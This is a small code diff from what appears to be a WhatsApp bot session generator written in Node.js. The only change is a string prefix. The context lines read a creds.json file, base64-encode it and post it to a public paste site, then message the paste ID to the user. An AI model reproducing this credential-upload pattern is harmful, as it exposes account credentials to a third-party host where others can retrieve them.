@@ -55,7 +55,7 @@ router.get('/', async (req, res) => {
 
                     const jsonData = await fs.promises.readFile(`${__dirname}/temp/${id}/creds.json`, 'utf-8');
                     const output = await axios.post('http://paste.c-net.org/',`${btoa(jsonData)}`, { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }});
-                    let data = "ᴀᴡᴇꜱᴏꪑᴇ" + output.data.split('/')[3]
+                    let data = "ᴀᴡᴇꜱᴏꪑᴇ~" + output.data.split('/')[3]
                     await session.sendMessage(session.user.id, { text: data });
 
                     await delay(100);
